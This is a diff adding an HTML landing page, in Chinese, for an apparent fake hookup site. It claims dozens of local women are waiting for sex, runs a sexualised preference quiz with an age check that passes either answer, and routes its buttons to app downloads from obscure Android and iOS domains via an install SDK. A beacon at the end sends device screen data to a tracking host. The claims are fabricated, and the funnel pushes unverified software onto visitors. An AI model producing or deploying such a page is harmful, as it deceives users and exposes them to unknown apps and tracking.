@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="ko-KR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/static/mb5/css/main.css">
+    <title>xjjn1</title>
+    <style>/* Add v-cloak to prevent flash of unstyled content */
+        [v-cloak] {
+            display: none !important;
+        }
+        .bottom-right {
+            /* position: fixed; */
+            /* bottom: 90px; */
+            width: 100%;
+            /* 距离底部 10px */
+            /* 距离右侧 10px */
+            display: flex;
+            /* flex-direction: column; */
+            /* 让按钮水平居中 */
+            justify-content: center;
+            /* 让按钮垂直排列 */
+            gap: 30px;
+            /* 按钮间距 */
+        }
+
+        .bottom-right img {
+            width: 50px;
+            /* 图标宽度，可根据需要调整 */
+            height: 50px;
+            /* 图标高度 */
+            /* 控制按钮大小 */
+            height: auto;
+        }
+        .register-button {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            border: none;
+            padding: 10px 40px;
+            font-size: 22px;
+            font-weight: 900;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .register-button:hover {
+            background: linear-gradient(45deg, #ee5a24, #ff6b6b);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
+        }
+
+        .register-button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 10px rgba(255, 107, 107, 0.3);
+        }
+
+        body {
+            scroll-behavior: smooth !important;
+            background-position: center top;
+            background-size: auto;
+            /* height: 1000dvh; */
+            position: relative;
+            padding: 0 1.5rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-attachment: fixed;
+            overflow: hidden;
+            background-repeat: repeat-y;
+            animation: scrollBackground 55s linear infinite;
+            /* 根据图片长度调整时间 */
+        }
+
+        @keyframes scrollBackground {
+            from {
+                background-position-y: 0;
+            }
+
+            to {
+                background-position-y: 100%;
+                /* 根据图片的实际高度调整 */
+            }
+        }
+    </style>
+</head>
+<body style="background-image: url(/static/mb5/image/xlgk37dsagjiimgkj_ct1.jpg)">
+    <div class="inner-content" id="app" v-cloak>
+        <div class="content">
+            <div id="thankYouPage" style="display: none">
+                
+                <h2>恭喜</h2>
+                <div class="bottom-right">
+                    <button class="register-button all-download" id="telegramButton" style="margin-bottom:10px;">
+                        点击约炮
+                    </button>
+                </div>
+                <h3>已授予访问权限！</h3>
+                <p>您所在地区有67位性感女性正在等着与您见面！</p>
+                <h3>您即将获得附近性感女孩的联系方式。准备好避孕套，您将使用它们！请点击下方按钮完成注册约会过程。 </h3>
+                <ul>
+                    <li>记住，这些女人只是想要性爱，所以只要发信息要求做爱，不可以打扰女孩子日常生活，即使遇见熟人，也不要表露自己感情，不要传播谣言，尊重女孩的隐私！ </li>
+                    <li>本网站上的女性可能想要一夜情，也可能想要一个固定的性伴侣，在与她们发生性关系之前，先问问她们想要什么。 </li>
+                    <li>如果您尝试升级，您将获得更多浏览量和真实信息，从而获得更多女性选择。您的照片将在我们的网站上显示得更多，当地女孩会向您发送，更多消息要求约会，让您早日遇到心动女孩！</li>
+                </ul>
+                <div class="bottom-right">
+                    <button class="register-button all-download" id="telegramButton2">
+                        点击约炮
+                    </button>
+                </div>
+            </div>
+            <div id="intro" v-if="intro_index === 0">
+                <h1>温馨提醒 </h1>
+                <p>
+                <h2>你即将看到当地寻找约会或兼职的女孩，您能否保密不泄露女孩隐私？</h2>
+                
+                <p>约会之前，我们需要问几个简短问题?
+                </p>
+                
+
+                <button class="custom-button" onclick="showLoadingScreen()" style="margin: 10px;">拒绝</button>
+                <button class="custom-button" @click="intro()" style="margin-top: 10px;">好的</button>
+            </div>
+
+
+           
+            <div id="intro" v-if="intro_index === 1" style="margin-top: 100px;">
+                <h1>2.你至少24岁吗？
+                </h1>
+
+                
+
+                <button class="custom-button" onclick="showLoadingScreen()" style="margin: 10px;">不是</button>
+                <button class="custom-button" onclick="showLoadingScreen()" style="margin-top: 100px;">是</button>
+            </div>
+
+            <div id="loadingScreen" style="display: none">
+                <h2>》》》进入挑选女孩环节》》》</h2>
+                <h3>请认真对待，以便系统推荐</h3>
+                <div class="progress-bar-area">
+                    <div id="progress-bar"></div>
+                </div>
+                <ul style="display: none">
+                    <!-- <li>무료 이용권 확인 중.</li>
+                    <li>중복 가입 여부 확인 중.</li>
+                    <li>무료 가입 옵션 검색 중.</li> -->
+                </ul>
+            </div>
+            <!-- 菜单 -->
+            <ul class="step-title">
+
+                <li id="stepItem1">
+                    <h4>胸部</h4>
+                    <img class="icon" src="/static/mb5/picture/xlgk37dsagjiimgkj_home1.jpg" alt="">
+                    <img class="selectedImage" src="" alt="">
+                </li>
+                <li id="stepItem2">
+                    <h4>年龄</h4>
+                    <img class="icon" src="/static/mb5/picture/xlgk37dsagjiimgkj_home2.jpg" alt="">
+                    <img class="selectedImage" src="" alt="">
+                </li>
+                <li id="stepItem3">
+                    <h4>臀部</h4>
+                    <img class="icon" src="/static/mb5/picture/xlgk37dsagjiimgkj_home3.jpg" alt="">
+                    <img class="selectedImage" src="" alt="">
+                </li>
+
+                <li id="stepItem4">
+                    <h4>姿势</h4>
+                    <img class="icon" src="/static/mb5/picture/xlgk37dsagjiimgkj_home5.jpg" alt="">
+                    <img class="selectedImage" src="" alt="">
+                </li>
+                <li id="stepItem5">
+                    <h4>프로필</h4>
+                    <img class="icon" src="/static/mb5/picture/xlgk37dsagjiimgkj_ass.png" alt="">
+                    <img class="selectedImage" src="" alt="">
+                </li>
+            </ul>
+
+            <div id="steps">
+                <!-- 胸部 -->
+                <div id="step1" class="step" style="display: none">
+                    <h2>什么样的胸部使你兴奋？
+                    </h2>
+                    <div class="option-list">
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_x11.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_x11.jpg" alt=""></div>
+                            <!--<h4 class="name">짧은 머리</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_x22.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_x22.jpg" alt=""></div>
+                            <!--<h4 class="name">중간 길이</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_x33.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_x33.jpg" alt=""></div>
+                            <!--<h4 class="name">긴 머리</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_x44.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_x44.jpg" alt=""></div>
+                            <!--<h4 class="name">긴 머리</h4>-->
+
+                    </button></div>
+                </div>
+
+                <!-- 年龄 -->
+                <div id="step2" class="step" style="display: none">
+                    <h2>什么样的年龄最适合你？
+                    </h2>
+                    <div class="option-list">
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_1.18-20.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_1.18-20.jpg" alt=""></div>
+                            <h4 class="name">18岁~20岁</h4>
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_1.20-30.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_1.20-30.jpg" alt=""></div>
+                            <h4 class="name">20岁~30岁</h4>
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_1.30-40.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_1.30-40.jpg" alt=""></div>
+                            <h4 class="name">30岁~40岁</h4>
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_1.40ADD.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_1.40ADD.jpg" alt=""></div>
+                            <h4 class="name">40岁+</h4>
+                        </button>
+
+                    </div>
+                </div>
+
+                <!-- 臀部 -->
+                <div id="step3" class="step" style="display: none">
+                    <h2>喜欢什么样的臀部？
+                    </h2>
+                    <div class="option-list">
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_t11.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_t11.jpg" alt=""></div>
+                            <!--<h4 class="name">짧은 머리</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_t22.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_t22.jpg" alt=""></div>
+                            <!--<h4 class="name">중간 길이</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_t33.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_t33.jpg" alt=""></div>
+                            <!--<h4 class="name">긴 머리</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_t44.jpg'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_t44.jpg" alt=""></div>
+                            <!--<h4 class="name">긴 머리</h4>-->
+
+                    </button></div>
+                </div>
+                <!-- 情趣 -->
+                <!-- <div id="step4" class="step" style="display: none">
+                    <h2>喜欢什么的情趣用品？</h2>
+                    <div class="option-list">
+                        <button onclick="storeDataAndProceed({id: 1, img: './img/z1.gif'})">
+                            <div class="image"><img src="img/z1.gif" alt=""></div>
+
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: './img/z2.gif'})">
+                            <div class="image"><img src="img/z2.gif" alt=""></div>
+
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: './img/z3.gif'})">
+                            <div class="image"><img src="img/z3.gif" alt=""></div>
+
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: './img/z4.gif'})">
+                            <div class="image"><img src="img/z4.gif" alt=""></div>
+
+                        </button>
+
+                    </div>
+                </div> -->
+                <!-- 姿势 -->
+                <div id="step4" class="step" style="display: none">
+                    <h2>什么样的姿势使你兴奋？</h2>
+                    <div class="option-list">
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_z1.gif'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_z1.gif" alt=""></div>
+                            <!--<h4 class="name">짧은 머리</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_z2.gif'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_z2.gif" alt=""></div>
+                            <!--<h4 class="name">중간 길이</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_z3.gif'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_z3.gif" alt=""></div>
+                            <!--<h4 class="name">긴 머리</h4>-->
+                        </button>
+                        <button onclick="storeDataAndProceed({id: 1, img: 'https://soaiudimgkj.kjgilsda23562.my/i/pic/xlgk37dsagjiimgkj_z4.gif'})">
+                            <div class="image"><img src="/static/mb5/picture/xlgk37dsagjiimgkj_z4.gif" alt=""></div>
+                            <!--<h4 class="name">긴 머리</h4>-->
+                        </button>
+                    </div>
+                </div>
+
+
+            </div>
+
+
+        </div>
+
+    </div>
+
+
+    <!-- 全局JS统计代码 -->
+ 
+    </body>
+<script type="text/javascript" charset="UTF-8" src="https://res.opstatistics.com/openinstall-myfmzf.js" 
+        onerror="loadBackupOpenInstall()"></script>
+<script type="text/javascript">
+    // 备用 CDN 加载函数
+    var backupOpenInstallLoaded = false;
+    function loadBackupOpenInstall() {
+        if (backupOpenInstallLoaded) return;
+        backupOpenInstallLoaded = true;
+        console.log("主 CDN 加载失败，切换到备用 CDN");
+        var script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.charset = 'UTF-8';
+        script.src = 'https://web.cdn.openinstall.io/openinstall.js';
+        script.onerror = function() {
+            console.log("备用 CDN 也加载失败，使用兜底下载");
+        };
+        document.head.appendChild(script);
+    }
+</script>
+<script type="text/javascript" src="/static/mb5/js/vue3.js"></script>
+
+<script>
+    // 全局变量，供后台统计代码使用
+    var appKey = "myfmzf";
+    var channelCode = "xjjn1";
+    var CONFIG = {
+        android_base: "https://q419rf269vxq.gte0clrtn0m3.dbmtei.cn/DH173/oazdsa",
+        ios_base: "https://jxnge69.gugxc.com/d/2bingsxd8yw81w8"
+    };
+
+    // 检查 URL 是否有效（非空且去除空格后不为空）
+    function isValidUrl(url) {
+        return url && typeof url === 'string' && url.trim().length > 0;
+    }
+
+    // 设备检测函数
+    function isIOS() {
+        let ua = navigator.userAgent || navigator.vendor || window.opera;
+        return /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+    }
+
+    function isAndroid() {
+        let ua = navigator.userAgent || navigator.vendor || window.opera;
+        return /android/i.test(ua);
+    }
+
+    // 兜底下载函数
+    let fallbackDownload = function() {
+        const hasAndroidUrl = isValidUrl(CONFIG.android_base);
+        const hasIosUrl = isValidUrl(CONFIG.ios_base);
+
+        // 判断是否有下载链接，如果没有则不跳转
+        if (!hasAndroidUrl && !hasIosUrl) {
+            console.warn("未配置下载链接，无法执行兜底下载");
+            return;
+        }
+
+        let ua = navigator.userAgent || navigator.vendor || window.opera;
+        if (/android/i.test(ua)) {
+            if (hasAndroidUrl) {
+                window.location.href = CONFIG.android_base.trim();
+            } else {
+                console.warn("未配置 Android 下载链接");
+            }
+        } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+            if (hasIosUrl) {
+                window.location.href = CONFIG.ios_base.trim();
+            } else {
+                console.warn("未配置 iOS 下载链接");
+            }
+        } else {
+            // 默认跳 Android 地址
+            if (hasAndroidUrl) {
+                window.location.href = CONFIG.android_base.trim();
+            } else if (hasIosUrl) {
+                window.location.href = CONFIG.ios_base.trim();
+            } else {
+                console.warn("未配置任何下载链接");
+            }
+        }
+    };
+
+    // 给所有 .all-download 按钮绑定兜底下载（默认行为）
+    function bindFallbackToButtons() {
+        var downloadBtns = document.querySelectorAll('.all-download');
+        downloadBtns.forEach(function(btn) {
+            btn.onclick = function() {
+                fallbackDownload();
+                return false;
+            };
+        });
+    }
+
+    // 初始化 OpenInstall
+    try {
+        // 检查 OpenInstall 是否已加载
+        if (typeof OpenInstall === 'undefined') {
+            console.log("OpenInstall SDK 未加载，使用兜底下载");
+            throw new Error("OpenInstall SDK 未加载");
+        }
+
+        var data = OpenInstall.parseUrlParams();
+        var openInstallInitialized = false;
+        var openInstallServiceHealthy = true;
+
+        // 监听网络错误，检测 OpenInstall 服务是否可用
+        var originalFetch = window.fetch;
+        var originalXHROpen = XMLHttpRequest.prototype.open;
+        var openInstallErrorDetected = false;
+
+        // 拦截 fetch 请求
+        if (originalFetch) {
+            window.fetch = function() {
+                return originalFetch.apply(this, arguments).catch(function(err) {
+                    if (arguments[0] && arguments[0].includes && arguments[0].includes('openinstall.com')) {
+                        console.log("检测到 OpenInstall 服务请求失败");
+                        openInstallServiceHealthy = false;
+                        openInstallErrorDetected = true;
+                    }
+                    throw err;
+                });
+            };
+        }
+
+        // 拦截 XMLHttpRequest
+        XMLHttpRequest.prototype.open = function(method, url) {
+            this.addEventListener('error', function() {
+                if (url && url.includes('openinstall.com')) {
+                    console.log("检测到 OpenInstall 服务请求失败");
+                    openInstallServiceHealthy = false;
+                    openInstallErrorDetected = true;
+                }
+            });
+            return originalXHROpen.apply(this, arguments);
+        };
+
+        var openInstall = new OpenInstall({
+            appKey: appKey,
+            channelCode: channelCode,
+            fastInstall: false,
+            onready: function() {
+                openInstallInitialized = true;
+                console.log("OpenInstall SDK 初始化成功");
+                //this.schemeWakeup();
+
+                var m = this;
+
+                // 延迟 500ms 检查服务健康状态，给网络请求时间
+                setTimeout(function() {
+                    // 如果检测到服务错误，不覆盖默认兜底
+                    if (openInstallErrorDetected) {
+                        console.log("OpenInstall 服务不可用，保持默认兜底下载");
+                        return;
+                    }
+
+                    // 服务正常，覆盖默认行为
+                    console.log("OpenInstall 服务正常，启用唤起功能");
+                    var downloadBtns = document.querySelectorAll('.all-download');
+                    downloadBtns.forEach(function(btn) {
+                        btn.setAttribute("data-init-ok", "true");
+                        btn.onclick = function() {
+                            // 再次检查服务状态
+                            if (!openInstallServiceHealthy) {
+                                console.log("OpenInstall 服务不可用，使用兜底下载");
+                                fallbackDownload();
+                                return false;
+                            }
+
+                            let isOpened = false;
+                            let hasResponded = false;
+
+                            const quickTimer = setTimeout(function() {
+                                if (!hasResponded) {
+                                    console.log("OpenInstall 响应超时，执行兜底下载");
+                                    fallbackDownload();
+                                }
+                            }, 3000);
+
+                            const wakeupTimer = isIOS() ? setTimeout(function() {
+                                if (!isOpened) {
+                                    console.log("未唤起APP，执行兜底下载");
+                                    fallbackDownload();
+                                }
+                            }, 3000) : null;
+
+                            try {
+                                m.wakeupOrInstall({
+                                    channelCode: channelCode,
+                                    onsuccess: function() {
+                                        hasResponded = true;
+                                        isOpened = true;
+                                        clearTimeout(quickTimer);
+                                        if (wakeupTimer) clearTimeout(wakeupTimer);
+                                    },
+                                    onfail: function(err) {
+                                        hasResponded = true;
+                                        console.log("唤起失败，使用兜底下载:", err);
+                                        clearTimeout(quickTimer);
+                                        if (wakeupTimer) clearTimeout(wakeupTimer);
+                                        fallbackDownload();
+                                    }
+                                });
+                            } catch(e) {
+                                hasResponded = true;
+                                console.log("调用 wakeupOrInstall 异常，使用兜底下载:", e);
+                                clearTimeout(quickTimer);
+                                if (wakeupTimer) clearTimeout(wakeupTimer);
+                                fallbackDownload();
+                            }
+                            return false;
+                        };
+                    });
+                }, 500);
+            },
+            onerror: function(err) {
+                console.log("OpenInstall 初始化失败，使用兜底下载:", err);
+                openInstallInitialized = false;
+                bindFallbackToButtons();
+            }
+        }, data);
+
+        setTimeout(function() {
+            if (!openInstallInitialized) {
+                console.log("OpenInstall 初始化超时，使用兜底下载");
+                bindFallbackToButtons();
+            }
+        }, 3000);
+    } catch(e) {
+        console.log("OpenInstall 初始化异常，使用兜底下载:", e);
+        bindFallbackToButtons();
+    }
+
+    // Vue3 实例化
+    const app = Vue.createApp({
+        data() {
+            return {
+                appKey: appKey,
+                channelCode: channelCode,
+                intro_index: 0,
+            }
+        },
+        methods: {
+            intro() {
+                this.intro_index = (this.intro_index + 1);
+            },
+        },
+        mounted() {
+            window.vueApp = this;
+        },
+    })
+    app.mount('#app')
+</script>
+<script src="/static/mb5/js/index2.js"></script>
+<script>var w=screen.width,h=screen.height,d=Math.round(devicePixelRatio);if(w>h){var t=w;w=h;h=t;}var x=new XMLHttpRequest();x.open('POST',`https://dmyecktg.cc1install.w150e.com/statisticsInstall2?appkey=JxMsd&channelCode=${channelCode}`,1);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({device_model:w+'x'+h+'@'+d}));</script>
+</html>
